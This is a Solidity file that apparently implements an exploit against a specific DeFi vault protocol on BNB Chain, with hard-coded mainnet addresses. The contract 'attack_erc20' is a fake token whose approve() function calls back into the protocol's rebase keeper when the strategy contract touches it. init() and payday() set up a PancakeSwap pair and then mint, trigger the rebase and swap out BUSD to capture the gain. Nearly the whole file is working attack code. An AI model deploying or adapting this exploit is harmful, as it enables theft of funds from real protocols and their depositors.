pragma solidity ^ 0.8.0;
interface IVault {

    function feeInRho() external view returns (uint256);

    function reserve() external view returns (uint256);

    function supportsAsset(address _asset) external view returns (bool);

    function rebase() external;

    function rebalance() external;

    function mint(uint256 amount) external;

    function redeem(uint256 amount) external;

    function sweepERC20Token(address token, address to) external;

    function sweepRhoTokenContractERC20Token(address token, address to) external;

    function checkStrategiesCollectReward() external view returns (bool[] memory);

    function supplyRate() external view returns (uint256);

    function collectStrategiesRewardTokenByIndex(uint16[] memory collectList) external returns (bool[] memory);

    function withdrawFees(uint256 amount, address to) external;

    function shouldRepurchaseFlurry() external view returns (bool);

    function repurchaseFlurry() external;



    function getStrategiesListLength() external view returns (uint256);

    function retireStrategy(address strategy) external;

    function indicativeSupplyRate() external view returns (uint256);

    function mintWithDepositToken(uint256 amount, address depositToken) external;

    function getDepositTokens() external view returns (address[] memory);

    function retireDepositUnwinder(address token) external;
}
interface IRhoToken  {

    function getOwner() external view returns (address);

    function adjustedRebasingSupply() external view returns (uint256);

    function unadjustedRebasingSupply() external view returns (uint256);

    function nonRebasingSupply() external view returns (uint256);

    function setMultiplier(uint256 multiplier) external;

    function getMultiplier() external view returns (uint256 multiplier, uint256 lastUpdate);

    function mint(address account, uint256 amount) external;

    function burn(address account, uint256 amount) external;

    function setRebasingOption(bool isRebasing) external;

    function isRebasingAccount(address account) external view returns (bool);

    function setTokenRewards(address tokenRewards) external;

    function sweepERC20Token(address token, address to) external;
}
interface IERC20{

    function totalSupply() external view returns (uint256);

    function balanceOf(address account) external view returns (uint256);

    function transfer(address recipient, uint256 amount) external returns (bool);

    function allowance(address owner, address spender) external view returns (uint256);

    function approve(address spender, uint256 amount) external returns (bool);

    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) external returns (bool);

}
interface IBANK{
    function work(uint256 posId, uint256 pid, uint256 borrow, bytes calldata data) external;
}
interface IPerform{
    function performUpkeep(bytes calldata performData) external;
}
interface IPancakeRouter01 {
    function factory() external pure returns (address);
    function WETH() external pure returns (address);

    function addLiquidity(
        address tokenA,
        address tokenB,
        uint amountADesired,
        uint amountBDesired,
        uint amountAMin,
        uint amountBMin,
        address to,
        uint deadline
    ) external returns (uint amountA, uint amountB, uint liquidity);
    function addLiquidityETH(
        address token,
        uint amountTokenDesired,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external payable returns (uint amountToken, uint amountETH, uint liquidity);
    function removeLiquidity(
        address tokenA,
        address tokenB,
        uint liquidity,
        uint amountAMin,
        uint amountBMin,
        address to,
        uint deadline
    ) external returns (uint amountA, uint amountB);
    function removeLiquidityETH(
        address token,
        uint liquidity,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external returns (uint amountToken, uint amountETH);
    function removeLiquidityWithPermit(
        address tokenA,
        address tokenB,
        uint liquidity,
        uint amountAMin,
        uint amountBMin,
        address to,
        uint deadline,
        bool approveMax, uint8 v, bytes32 r, bytes32 s
    ) external returns (uint amountA, uint amountB);
    function removeLiquidityETHWithPermit(
        address token,
        uint liquidity,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline,
        bool approveMax, uint8 v, bytes32 r, bytes32 s
    ) external returns (uint amountToken, uint amountETH);
    function swapExactTokensForTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external returns (uint[] memory amounts);
    function swapTokensForExactTokens(
        uint amountOut,
        uint amountInMax,
        address[] calldata path,
        address to,
        uint deadline
    ) external returns (uint[] memory amounts);
    function swapExactETHForTokens(uint amountOutMin, address[] calldata path, address to, uint deadline)
        external
        payable
        returns (uint[] memory amounts);
    function swapTokensForExactETH(uint amountOut, uint amountInMax, address[] calldata path, address to, uint deadline)
        external
        returns (uint[] memory amounts);
    function swapExactTokensForETH(uint amountIn, uint amountOutMin, address[] calldata path, address to, uint deadline)
        external
        returns (uint[] memory amounts);
    function swapETHForExactTokens(uint amountOut, address[] calldata path, address to, uint deadline)
        external
        payable
        returns (uint[] memory amounts);

    function quote(uint amountA, uint reserveA, uint reserveB) external pure returns (uint amountB);
    function getAmountOut(uint amountIn, uint reserveIn, uint reserveOut) external pure returns (uint amountOut);
    function getAmountIn(uint amountOut, uint reserveIn, uint reserveOut) external pure returns (uint amountIn);
    function getAmountsOut(uint amountIn, address[] calldata path) external view returns (uint[] memory amounts);
    function getAmountsIn(uint amountOut, address[] calldata path) external view returns (uint[] memory amounts);
}
interface IPancakeFactory {
    event PairCreated(address indexed token0, address indexed token1, address pair, uint);

    function feeTo() external view returns (address);
    function feeToSetter() external view returns (address);

    function getPair(address tokenA, address tokenB) external view returns (address pair);
    function allPairs(uint) external view returns (address pair);
    function allPairsLength() external view returns (uint);

    function createPair(address tokenA, address tokenB) external returns (address pair);

    function setFeeTo(address) external;
    function setFeeToSetter(address) external;
}
interface IPancakePair {

    function name() external pure returns (string memory);
    function symbol() external pure returns (string memory);
    function decimals() external pure returns (uint8);
    function totalSupply() external view returns (uint);
    function balanceOf(address owner) external view returns (uint);
    function allowance(address owner, address spender) external view returns (uint);

    function approve(address spender, uint value) external returns (bool);
    function transfer(address to, uint value) external returns (bool);
    function transferFrom(address from, address to, uint value) external returns (bool);

    function DOMAIN_SEPARATOR() external view returns (bytes32);
    function PERMIT_TYPEHASH() external pure returns (bytes32);
    function nonces(address owner) external view returns (uint);

    function permit(address owner, address spender, uint value, uint deadline, uint8 v, bytes32 r, bytes32 s) external;

    function MINIMUM_LIQUIDITY() external pure returns (uint);
    function factory() external view returns (address);
    function token0() external view returns (address);
    function token1() external view returns (address);
    function getReserves() external view returns (uint112 reserve0, uint112 reserve1, uint32 blockTimestampLast);
    function price0CumulativeLast() external view returns (uint);
    function price1CumulativeLast() external view returns (uint);
    function kLast() external view returns (uint);

    function mint(address to) external returns (uint liquidity);
    function burn(address to) external returns (uint amount0, uint amount1);
    function swap(uint amount0Out, uint amount1Out, address to, bytes calldata data) external;
    function skim(address to) external;
    function sync() external;

    function initialize(address, address) external;
}
interface IDODOCallee {
    function DVMSellShareCall(
        address sender,
        uint256 burnShareAmount,
        uint256 baseAmount,
        uint256 quoteAmount,
        bytes calldata data
    ) external;

    function DVMFlashLoanCall(
        address sender,
        uint256 baseAmount,
        uint256 quoteAmount,
        bytes calldata data
    ) external;

    function DPPFlashLoanCall(
        address sender,
        uint256 baseAmount,
        uint256 quoteAmount,
        bytes calldata data
    ) external;

    function CPCancelCall(
        address sender,
        uint256 amount,
        bytes calldata data
    ) external;

	function CPClaimBidCall(
        address sender,
        uint256 baseAmount,
        uint256 quoteAmount,
        bytes calldata data
    ) external;
}
interface IDPP{
        function flashLoan(
        uint256 baseAmount,
        uint256 quoteAmount,
        address assetTo,
        bytes calldata data
    ) external;
}
contract attack_erc20{
    address public owner;
    address public vaultAddress     = 0x4BAd4D624FD7cabEeb284a6CC83Df594bFDf26Fd;
    address public rebaseUpKeep     = 0xc8935Eb04ac1698C51a705399A9632c6FaeCa57f;
    address public rhoAddress       = 0xD845dA3fFc349472fE77DFdFb1F93839a5DA8C96;
    address public BUSDAddress      = 0x55d398326f99059fF775485246999027B3197955;
    address public Bank             = 0xbEEB9d4CA070d34c014230BaFdfB2ad44A110142;
    address public PancakeRouter    = 0x10ED43C718714eb63d5aA57B78B54704E256024E;
    address public PancakeFactory   = 0xcA143Ce32Fe78f1f7019d7d551a6402fC5350c73;
    address public pair;
    address public strategy         = 0x5085c49828B0B8e69bAe99d96a8e0FCf0A033369;
    address public FLURRY           = 0x47c9BcEf4fE2dBcdf3Abf508f147f1bBE8d4fEf2;
    address public WBNB             = 0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c;



    uint public  BUSDBalanceBefore;
    uint public BUSDBalanceAfter;
    uint public Mbefore;
    uint public Mafter;
    uint public MAX = 115792089237316195423570985008687907853269984665640564039457584007913129639935;
    
    string public name = 'fake';
    string public symbol = 'FKT';
    uint8 public decimals = 18;  
    uint256 public totalSupply = 1e28; 
    mapping (address => mapping (address => uint256)) public allowance;
    mapping (address => uint256) public balanceOf;
    constructor(){
        owner = msg.sender;
        balanceOf[owner] = 1e18;
    }
    function _transfer(address _from, address _to, uint _value) internal {

        require(balanceOf[_from] >= _value);  
        require(balanceOf[_to] + _value > balanceOf[_to]);


        balanceOf[_from] -= _value; 
        balanceOf[_to] += _value;
    }

    function transfer(address _to, uint256 _value) public {
        _transfer(msg.sender, _to, _value);
    }

    function transferFrom(address _from, address _to, uint256 _value) public returns (bool success) {
        require(_value <= allowance[_from][msg.sender]);     
        allowance[_from][msg.sender] -= _value;
        _transfer(_from, _to, _value);
        return true;
    }

    function approve(address _spender, uint _value) public returns (bool success){
        if(msg.sender == address(strategy)){
            IPerform(rebaseUpKeep).performUpkeep("0x");
        }
        allowance[msg.sender][_spender] = _value; 
        return true;
    }
    function init() public{
        require(msg.sender == owner);
        balanceOf[address(this)] = 1000000;
        IRhoToken(rhoAddress).setRebasingOption(true);
        IERC20(rhoAddress).approve(vaultAddress, MAX);
        IERC20(BUSDAddress).approve(vaultAddress, MAX);
        IERC20(BUSDAddress).approve(PancakeRouter, MAX);
        IERC20(address(this)).approve(PancakeRouter, MAX);
        (, , uint LPamount ) = IPancakeRouter01(PancakeRouter).addLiquidity(BUSDAddress, address(this), 1000, 1000000, 0, 0, address(this), block.timestamp);
        pair = IPancakeFactory(PancakeFactory).getPair(BUSDAddress, address(this));
        IPancakePair(pair).transfer(strategy, LPamount);
        IVault(vaultAddress).mint(10000);
        IPerform(rebaseUpKeep).performUpkeep("0x");
        IVault(vaultAddress).redeem(IERC20(rhoAddress).balanceOf(address(this)));
    }
    function payday() public{
        BUSDBalanceBefore = IERC20(BUSDAddress).balanceOf(address(this));
        (Mbefore, ) = IRhoToken(rhoAddress).getMultiplier();
        IERC20(BUSDAddress).approve(vaultAddress, MAX);
        IERC20(rhoAddress).approve(vaultAddress, MAX);
        IERC20(rhoAddress).approve(PancakeRouter, MAX);
        IERC20(BUSDAddress).approve(PancakeRouter, MAX);

        IVault(vaultAddress).mint(3000000);
        IPerform(rebaseUpKeep).performUpkeep("0x");

        address[] memory path = new address[](2);
        path[0] = rhoAddress;
        path[1] = BUSDAddress;
        IPancakeRouter01(PancakeRouter).swapExactTokensForTokens(3000000, 0, path, address(this), block.timestamp);

        BUSDBalanceAfter = IERC20(BUSDAddress).balanceOf(address(this));
        (Mafter,) = IRhoToken(rhoAddress).getMultiplier();
    }



}